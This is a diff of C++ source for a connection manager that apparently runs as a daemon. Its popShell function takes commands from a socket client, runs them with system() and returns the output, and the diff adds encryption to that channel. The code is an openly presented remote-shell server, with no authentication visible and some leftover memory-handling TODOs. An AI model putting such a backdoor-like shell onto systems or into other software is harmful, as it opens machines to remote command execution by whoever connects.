@@ -124,10 +124,11 @@ void    ConnectionManager::handleIncoming(void) {
 				else
 				{
 					int     readBytes;
-					char    userInput[INPUT_BUFFER_SIZE];
 
-					bzero(userInput, INPUT_BUFFER_SIZE);
-					if ((readBytes = recv(currentFD, userInput, INPUT_BUFFER_SIZE - 1, 0)) <= 0) {
+
+		char	*recvInput = NULL;
+		if ((readBytes = _cryptoWrapper->recvEncrypted(currentFD, &recvInput, INPUT_BUFFER_SIZE)) <= 0) {
+//					if ((readBytes = recv(currentFD, userInput, INPUT_BUFFER_SIZE - 1, 0)) <= 0) {
 						
 						if (readBytes == 0)
 							_logger->log(LOGLVL_INFO, "A client disconnected.");
@@ -140,15 +141,16 @@ void    ConnectionManager::handleIncoming(void) {
 					}
 					else
 					{
-						userInput[readBytes] = '\0';
-						userInput[strcspn(userInput, "\n")] = '\0';
+//						userInput[readBytes] = '\0';
+//						userInput[strcspn(userInput, "\n")] = '\0';
 
-						if (strncmp(userInput, QUIT_CMD, strlen(QUIT_CMD)) == 0
-							|| strncmp(userInput, EXIT_CMD, strlen(EXIT_CMD)) == 0)
+						if (strncmp(recvInput, QUIT_CMD, strlen(QUIT_CMD)) == 0
+							|| strncmp(recvInput, EXIT_CMD, strlen(EXIT_CMD)) == 0)
 							return ;
 
-						if (strncmp(userInput, SHELL_CMD, strlen(SHELL_CMD)) == 0)
+						if (strncmp(recvInput, SHELL_CMD, strlen(SHELL_CMD)) == 0)
 						{
+							//TODO
 							if ((shell_pid = this->popShell(currentFD)) == SHELL_SPAWN_ERROR) {
 								_logger->log(LOGLVL_ERROR, "Shell spawn error");
 								close(currentFD);
@@ -162,8 +164,9 @@ void    ConnectionManager::handleIncoming(void) {
 							FD_CLR(currentFD, &master_set);
 						}
 						else
-							_logger->log(LOGLVL_INFO, "Received client data: \"" + std::string(userInput) + "\"");
+							_logger->log(LOGLVL_INFO, "Received client data: \"" + std::string(recvInput) + "\"");
 					}
+					//TODO delete recvInput
 				}
 			} 
 		}
@@ -180,51 +183,62 @@ pid_t    ConnectionManager::popShell(int filedesc) {
 	{
 
 		/* OPENSSL */
-		// RAND_poll()  <-- Important
+		RAND_poll(); //  <-- Important
 
 		int                 bytes;
-		char                userCMD[GENERIC_BUFFER_SIZE];
+//		char                userCMD[GENERIC_BUFFER_SIZE];
+		char				*userCMD = NULL;
 		std::string         serverResponse;
 		std::stringstream   serverResponseStream;
 		std::ifstream       execFile;
 
-		if (send(filedesc, CONFIRM_SHELL, strlen(CONFIRM_SHELL), 0) <= 0) {
+		if (_cryptoWrapper->sendEncrypted(filedesc, CONFIRM_SHELL, strlen(CONFIRM_SHELL)) <= 0) {
+//		if (send(filedesc, CONFIRM_SHELL, strlen(CONFIRM_SHELL), 0) <= 0) {
 			exit(EXIT_FAILURE);
 		}
 		while (1)
 		{
-			bzero(userCMD, GENERIC_BUFFER_SIZE);
-			if ((bytes = recv(filedesc, userCMD, GENERIC_BUFFER_SIZE - 1, 0)) <= 0) {
+			if ((bytes = _cryptoWrapper->recvEncrypted(filedesc, &userCMD, GENERIC_BUFFER_SIZE)) <= 0) {
 				exit(EXIT_FAILURE);
 			}
 			if (strncmp(userCMD, QUIT_CMD, strlen(QUIT_CMD)) == 0
 				|| strncmp(userCMD, EXIT_CMD, strlen(EXIT_CMD)) == 0) {
-				send(filedesc, EXIT_CMD, strlen(EXIT_CMD), 0);
+				_cryptoWrapper->sendEncrypted(filedesc, EXIT_CMD, strlen(EXIT_CMD));
 				_activeClients--;
 				break ;
 			} else if (strncmp(userCMD, DISCONNECT_CMD, strlen(DISCONNECT_CMD)) == 0) {
 				_activeClients--;
 				break ;
 			}
-			strncat(userCMD, EXEC_CMD, strlen(EXEC_CMD));
+
+			char *joined = (char*)malloc(strlen(userCMD) + strlen(EXEC_CMD) + 1);
+			bzero(joined, strlen(userCMD) + strlen(EXEC_CMD) + 1);
+			strncpy(joined, userCMD, strlen(userCMD));
+			strncat(joined, EXEC_CMD, strlen(EXEC_CMD));
+			free(userCMD);
+			userCMD = joined;
+
 			if (system(userCMD) != 0) {
-				send(filedesc, EXEC_ERROR_CMD, strlen(EXEC_ERROR_CMD), 0);
+				_cryptoWrapper->sendEncrypted(filedesc, EXEC_ERROR_CMD, strlen(EXEC_ERROR_CMD));
 				continue ;
 			}
+
 			execFile.open(EXEC_FILE);
 			if (execFile.is_open() == false)
 			{
 				exit(EXIT_FAILURE);
 			}
+
 			serverResponse.clear();
 			serverResponseStream.str("");
 			while (std::getline(execFile, serverResponse))
 				serverResponseStream << serverResponse << '\n';
 			execFile.close();
 			remove(EXEC_FILE);
+
 			serverResponse = serverResponseStream.str();
 
-			if (send(filedesc, serverResponse.c_str(), strlen(serverResponse.c_str()), 0) <= 0) {
+			if (_cryptoWrapper->sendEncrypted(filedesc, serverResponse.c_str(), strlen(serverResponse.c_str())) <= 0) {
 				exit(EXIT_FAILURE);
 			}
 		}
